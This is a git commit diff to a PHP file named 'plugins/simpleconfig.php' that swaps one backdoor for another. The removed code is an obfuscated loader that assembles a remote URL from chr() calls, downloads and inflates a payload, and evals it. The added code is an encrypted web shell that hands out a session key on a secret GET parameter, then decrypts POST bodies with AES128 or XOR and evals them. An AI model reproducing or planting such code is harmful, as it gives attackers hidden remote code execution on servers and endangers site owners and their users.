92f823ad209859dc63d4df9397705a768480e94a
TimeS0ng <times0ng@163.com>
2020-04-08 14:59:10 +0800

    Update simpleconfig.php

--- plugins/simpleconfig.php
+++ plugins/simpleconfig.php
@@ -1,22 +1,33 @@
 <?php
-$password='f7s87fuo1i3fu';
-$c='chr';
+@error_reporting(0);
 session_start();
-if(empty($_SESSION['PhpCode'])){
-$url=$c(104).$c(116).$c(116).$c(112).$c(58).$c(47);
-$url.=$c(47).$c(105).$c(46).$c(110).$c(105).$c(117);
-$url.=$c(112).$c(105).$c(99).$c(46).$c(99).$c(111);
-$url.=$c(109).$c(47).$c(105).$c(109).$c(97).$c(103);
-$url.=$c(101).$c(115).$c(47).$c(50).$c(48).$c(49).$c(55);
-$url.=$c(47).$c(48).$c(53).$c(47).$c(50).$c(49).$c(47);
-$url.=$c(118).$c(49).$c(81).$c(82).$c(49).$c(77).$c(46).$c(103).$c(105).$c(102);
-echo $url;
-$get=chr(102).chr(105).chr(108).chr(101).chr(95);
-$get.=chr(103).chr(101).chr(116).chr(95).chr(99);
-$get.=chr(111).chr(110).chr(116).chr(101).chr(110);
-$get.=chr(116).chr(115);
-$_SESSION['PhpCode']=$get($url);}
-$un=$c(103).$c(122).$c(105).$c(110);
-$un.=$c(102).$c(108).$c(97).$c(116).$c(base64_decode('MTAx'));
-@eval($un($_SESSION['PhpCode']));
+if (isset($_GET['sud87fosf9']))
+{
+    $key=substr(md5(uniqid(rand())),16);
+    $_SESSION['k']=$key;
+    print $key;
+}
+else
+{
+    $key=$_SESSION['k'];
+	$post=file_get_contents("php://input");
+	if(!extension_loaded('openssl'))
+	{
+		$t="base64_"."decode";
+		$post=$t($post."");
+		
+		for($i=0;$i<strlen($post);$i++) {
+    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
+    			}
+	}
+	else
+	{
+		$post=openssl_decrypt($post, "AES128", $key);
+	}
+    $arr=explode('|',$post);
+    $func=$arr[0];
+    $params=$arr[1];
+	class C{public function __construct($p) {eval($p."");}}
+	@new C($params);
+}
 ?>
